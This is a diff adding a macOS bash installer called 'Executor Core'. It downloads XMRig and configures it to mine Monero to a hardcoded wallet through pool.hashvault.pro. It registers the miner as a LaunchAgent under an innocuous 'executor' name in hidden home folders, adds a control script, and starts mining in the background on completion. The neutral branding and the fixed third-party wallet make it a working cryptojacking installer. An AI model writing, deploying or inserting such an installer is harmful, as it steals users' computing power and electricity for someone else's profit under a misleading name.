@@ -1,0 +1,192 @@
+```bash
+#!/bin/bash
+set -euo pipefail
+
+VERSION="6.26.0"
+WALLET="43qUaFUkE2KB4qLHALW6H5bPWPSdnn7F4GCzEVyX7CbZCtEmjycx8z2d7ts63ekU7HNXFgsrWgYJkauXXwtcFSXx5cUYF6E"
+
+BASE="$HOME/.executor"
+BIN="$BASE/bin"
+CONFIG="$HOME/.config/xmrig"
+AGENTS="$HOME/Library/LaunchAgents"
+LABEL="com.executor.xmrig"
+PLIST="$AGENTS/$LABEL.plist"
+EXECUTOR="$BIN/executor"
+
+mkdir -p "$BIN" "$CONFIG" "$AGENTS"
+
+echo "Executor Core — Homebrew-free installer"
+echo "----------------------------------------"
+
+ARCH="$(uname -m)"
+case "$ARCH" in
+  arm64)
+    ASSET="xmrig-${VERSION}-macos-arm64.tar.gz"
+    HASH="6ae4eb4216e99a201ae9a3d2c3a7c275207c5165cfc25da1f3d735d6c4829c18"
+    ;;
+  x86_64)
+    ASSET="xmrig-${VERSION}-macos-x64.tar.gz"
+    HASH="1da924b358c0089e361540c4a9e6f8b09538b29efeafa2379590e0f6db358ff4"
+    ;;
+  *)
+    echo "Unsupported Mac architecture: $ARCH"
+    exit 1
+    ;;
+esac
+
+echo "Detected: $ARCH"
+
+TMP="$(mktemp -d)"
+trap 'rm -rf "$TMP"' EXIT
+
+URL="https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${ASSET}"
+
+echo "Downloading official XMRig release..."
+curl -fL --retry 3 "$URL" -o "$TMP/$ASSET"
+
+echo "Checking download integrity..."
+ACTUAL="$(shasum -a 256 "$TMP/$ASSET" | awk '{print $1}')"
+
+if [[ "$ACTUAL" != "$HASH" ]]; then
+  echo "SHA-256 check failed. Nothing was installed."
+  exit 1
+fi
+
+echo "Extracting..."
+tar -xzf "$TMP/$ASSET" -C "$TMP"
+
+XMRIG="$(find "$TMP" -type f -name xmrig -print -quit)"
+
+if [[ -z "$XMRIG" ]]; then
+  echo "Could not find the XMRig executable in the archive."
+  exit 1
+fi
+
+install -m 755 "$XMRIG" "$BIN/xmrig"
+
+echo "Configuring wallet..."
+
+cat > "$CONFIG/config.json" <<EOF
+{
+  "autosave": true,
+  "background": false,
+  "colors": false,
+  "title": false,
+  "donate-level": 1,
+  "print-time": 60,
+  "pools": [
+    {
+      "url": "pool.hashvault.pro:443",
+      "user": "$WALLET",
+      "pass": "macbook-worker",
+      "keepalive": true,
+      "tls": true
+    }
+  ]
+}
+EOF
+
+chmod 600 "$CONFIG/config.json"
+
+cat > "$PLIST" <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>$LABEL</string>
+
+  <key>ProgramArguments</key>
+  <array>
+    <string>$BIN/xmrig</string>
+    <string>--config=$CONFIG/config.json</string>
+    <string>--threads=2</string>
+    <string>--cpu-priority=1</string>
+  </array>
+
+  <key>RunAtLoad</key>
+  <false/>
+
+  <key>KeepAlive</key>
+  <false/>
+
+  <key>StandardOutPath</key>
+  <string>$BASE/xmrig.log</string>
+
+  <key>StandardErrorPath</key>
+  <string>$BASE/xmrig-error.log</string>
+</dict>
+</plist>
+EOF
+
+cat > "$EXECUTOR" <<'CONTROL'
+#!/bin/bash
+
+LABEL="com.executor.xmrig"
+BASE="$HOME/.executor"
+PLIST="$HOME/Library/LaunchAgents/$LABEL.plist"
+UID_NUM="$(id -u)"
+TARGET="gui/$UID_NUM/$LABEL"
+
+case "${1:-}" in
+  start)
+    if launchctl print "$TARGET" >/dev/null 2>&1; then
+      launchctl kickstart -k "$TARGET"
+    else
+      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+      launchctl kickstart "$TARGET"
+    fi
+    echo "Executor started in the background."
+    ;;
+
+  stop)
+    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
+    echo "Executor stopped."
+    ;;
+
+  restart)
+    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
+    launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+    launchctl kickstart "$TARGET"
+    echo "Executor restarted."
+    ;;
+
+  status)
+    if pgrep -f "$HOME/.executor/bin/xmrig" >/dev/null; then
+      echo "Executor is running."
+      pgrep -fl "$HOME/.executor/bin/xmrig"
+    else
+      echo "Executor is stopped."
+    fi
+    ;;
+
+  logs)
+    tail -n 40 -f "$BASE/xmrig.log"
+    ;;
+
+  uninstall)
+    launchctl bootout "gui/$UID_NUM" "$PLIST" 2>/dev/null || true
+    rm -f "$PLIST" "$BASE/bin/xmrig" "$BASE/bin/executor"
+    rm -rf "$HOME/.config/xmrig"
+    echo "Executor removed. Log files were kept in $BASE."
+    ;;
+
+  *)
+    echo "Usage: executor {start|stop|restart|status|logs|uninstall}"
+    ;;
+esac
+CONTROL
+
+chmod +x "$EXECUTOR"
+
+echo ""
+echo "Installation complete!"
+echo "Start:     $EXECUTOR start"
+echo "Stop:      $EXECUTOR stop"
+echo "Status:    $EXECUTOR status"
+echo "Logs:      $EXECUTOR logs"
+echo "Uninstall: $EXECUTOR uninstall"
+echo ""
+echo "Starting Executor..."
+"$EXECUTOR" start
+```
